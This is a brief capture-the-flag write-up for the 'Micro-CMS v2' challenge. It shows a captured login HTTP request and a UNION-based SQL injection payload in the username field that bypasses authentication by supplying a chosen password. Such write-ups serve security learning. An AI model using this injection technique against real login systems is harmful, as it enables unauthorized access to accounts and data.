## Micro-CMS v2

URL : http://34.94.3.143/7cb9cccb9d/login

```

POST /ec02fa7d15/login HTTP/1.1
Host: 34.94.3.143
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://34.94.3.143
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://34.94.3.143/ec02fa7d15/login
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

username=lol&password=troll

```

- Here username was injectable, and password was not. 
- So what we did here is we injected below SQL query in username field.
`' UNION SELECT 123 AS password FROM admins WHERE '1'='1`
- and 123 as password.